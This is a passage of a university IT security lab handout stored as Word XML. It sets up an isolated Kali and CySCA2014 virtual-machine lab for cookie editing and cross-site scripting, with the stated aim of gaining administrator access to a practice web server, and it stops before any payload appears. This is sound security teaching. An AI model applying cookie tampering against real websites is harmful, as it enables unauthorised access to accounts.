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A9A059" w14:textId="2BE15CC2" w:rsidR="00EB19C9" w:rsidRPr="00FA4E5F" w:rsidRDefault="00FB75A2" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="4" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="4" w:color="auto"/>
        </w:pBdr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:softHyphen/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:softHyphen/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:softHyphen/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:softHyphen/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:softHyphen/>
      </w:r>
      <w:r w:rsidR="00057682" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>COS</w:t>
      </w:r>
      <w:r w:rsidR="007423CC" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidR="00057682" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>001</w:t>
      </w:r>
      <w:r w:rsidR="007423CC" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidR="00057682" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> I</w:t>
      </w:r>
      <w:r w:rsidR="00942DF4" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidR="00057682" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Security</w:t>
      </w:r>
      <w:r w:rsidR="00E75062" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:r w:rsidR="00EB19C9" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Lab week 7</w:t>
      </w:r>
      <w:r w:rsidR="00652E9E">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Faizal Alias)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4579660D" w14:textId="77777777" w:rsidR="00EB19C9" w:rsidRPr="00FA4E5F" w:rsidRDefault="00EB19C9" w:rsidP="00E75062">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D4CD3E4" w14:textId="77777777" w:rsidR="00E75062" w:rsidRPr="00FA4E5F" w:rsidRDefault="00EB19C9" w:rsidP="00E75062">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">In this lab you will </w:t>
      </w:r>
      <w:r w:rsidR="00AC500D" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>edit</w:t>
      </w:r>
      <w:r w:rsidR="00AC500D" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> cookies </w:t>
      </w:r>
      <w:r w:rsidR="00AC500D" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">and perform </w:t>
      </w:r>
      <w:r w:rsidR="00AC500D" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">cross-site scripting. </w:t>
      </w:r>
      <w:r w:rsidR="00AC500D" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>This lab is ba</w:t>
      </w:r>
      <w:r w:rsidR="00785006" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00AC500D" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ed on the first two Web Penetration challenges from</w:t>
      </w:r>
      <w:r w:rsidR="00AC500D" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> CySCA2014</w:t>
      </w:r>
      <w:r w:rsidR="00AC500D" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6769C37E" w14:textId="77777777" w:rsidR="00EB19C9" w:rsidRPr="00FA4E5F" w:rsidRDefault="00AC500D" w:rsidP="00E75062">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:hyperlink r:id="rId8" w:history="1">
        <w:r w:rsidR="0062080C" w:rsidRPr="00FA4E5F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:t>https://www.cyberchallenge.com.au/pdf/CySCA2014_Web_Penetration_Testing.pdf</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C724B76" w14:textId="078BEC25" w:rsidR="00F513E6" w:rsidRDefault="00F513E6" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
        </w:pBdr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="C45911"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="C45911"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Note: Follow the steps closely. Do not skip.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F7DA7AA" w14:textId="421AE28E" w:rsidR="00EB19C9" w:rsidRPr="00FA4E5F" w:rsidRDefault="00EB19C9" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
        </w:pBdr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">Part 1: </w:t>
      </w:r>
      <w:r w:rsidR="00AC500D" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Cookie editing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72961E5D" w14:textId="77777777" w:rsidR="00E75062" w:rsidRPr="00FA4E5F" w:rsidRDefault="00E75062" w:rsidP="00E75062">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0417CE6C" w14:textId="77777777" w:rsidR="00E75062" w:rsidRPr="00FA4E5F" w:rsidRDefault="00AC500D" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="Quote"/>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="000000"/>
          <w:left w:val="single" w:sz="4" w:space="4" w:color="000000"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="000000"/>
          <w:right w:val="single" w:sz="4" w:space="4" w:color="000000"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="E5E5E5"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:i w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:i w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">When cookies are used to store user privileges… </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2056C9CC" w14:textId="77777777" w:rsidR="00E75062" w:rsidRPr="00FA4E5F" w:rsidRDefault="00E75062" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="Quote"/>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="000000"/>
          <w:left w:val="single" w:sz="4" w:space="4" w:color="000000"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="000000"/>
          <w:right w:val="single" w:sz="4" w:space="4" w:color="000000"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="E5E5E5"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:i w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:i w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">This is an </w:t>
      </w:r>
      <w:r w:rsidR="00AC500D" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:i w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Epic Fail!</w:t>
      </w:r>
      <w:r w:rsidR="005A1606" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:i w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:i w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>on the Web Server side.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C88524E" w14:textId="77777777" w:rsidR="00EB19C9" w:rsidRPr="00FA4E5F" w:rsidRDefault="005A1606" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="Quote"/>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="000000"/>
          <w:left w:val="single" w:sz="4" w:space="4" w:color="000000"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="000000"/>
          <w:right w:val="single" w:sz="4" w:space="4" w:color="000000"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="E5E5E5"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:i w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:i w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">The goal is to log in as an administrator. </w:t>
      </w:r>
      <w:r w:rsidR="00CA4DA6" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:i w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>We have been given the following hint:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54CA40D8" w14:textId="77777777" w:rsidR="00CA4DA6" w:rsidRPr="00FA4E5F" w:rsidRDefault="001C35C4" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:pict w14:anchorId="2A6FE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85pt;height:64.1pt">
            <v:imagedata r:id="rId9" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E267562" w14:textId="77777777" w:rsidR="006E1A1B" w:rsidRPr="00FA4E5F" w:rsidRDefault="002A4922" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">Using the VirtualBox </w:t>
      </w:r>
      <w:r w:rsidR="00B36F64" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>on your PC, load</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> and Login</w:t>
      </w:r>
      <w:r w:rsidR="00B36F64" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5472256A" w14:textId="77777777" w:rsidR="00E75062" w:rsidRPr="00FA4E5F" w:rsidRDefault="00AC500D" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">Kali Linux with </w:t>
      </w:r>
      <w:r w:rsidR="002A4922" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Host-only Adapter</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A12343E" w14:textId="77777777" w:rsidR="00702411" w:rsidRPr="00FA4E5F" w:rsidRDefault="00AC500D" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>CY</w:t>
      </w:r>
      <w:r w:rsidR="002A4922" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>SCA2014InABox with Host-only Adapter</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="676AF51B" w14:textId="77777777" w:rsidR="0062080C" w:rsidRPr="00FA4E5F" w:rsidRDefault="00702411" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">Note: </w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">We are going to learn how to conduct attacks on CYSCA web server. CYSCA will run as a Web Server, and </w:t>
      </w:r>
      <w:r w:rsidR="00E75062" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">we </w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>leave it running at the back.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D49EAB2" w14:textId="77777777" w:rsidR="005A1606" w:rsidRPr="00FA4E5F" w:rsidRDefault="00057682" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">Open </w:t>
      </w:r>
      <w:r w:rsidR="005F3A43" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Firefox</w:t>
      </w:r>
      <w:r w:rsidR="002A4922" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> on Kali</w:t>
      </w:r>
      <w:r w:rsidR="005F3A43" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>, and browse over to CySCA &lt;IP below is the CySCA ip&gt;</w:t>
      </w:r>
      <w:r w:rsidR="00625BDB" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="005A1606" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:t>http://</w:t>
      </w:r>
      <w:r w:rsidR="002D1941" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:t>192.168.</w:t>
      </w:r>
      <w:r w:rsidR="002D1941" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:t>100.210</w:t>
      </w:r>
      <w:r w:rsidR="005A1606" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:t>/index.php</w:t>
      </w:r>
      <w:r w:rsidR="00EB19C9" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00625BDB" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="005A1606" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:t>You should see a welcome page for Fortress Certifications.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67BD78FE" w14:textId="77777777" w:rsidR="005F3A43" w:rsidRPr="00FA4E5F" w:rsidRDefault="001C35C4" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="644"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:pict w14:anchorId="222FF0BF">
          <v:shape id="Picture 1" o:spid="_x0000_i1026" type="#_x0000_t75" style="width:325.45pt;height:175.2pt;visibility:visible">
            <v:imagedata r:id="rId10" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AD7894E" w14:textId="77777777" w:rsidR="005A1606" w:rsidRPr="00FA4E5F" w:rsidRDefault="005F3A43" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
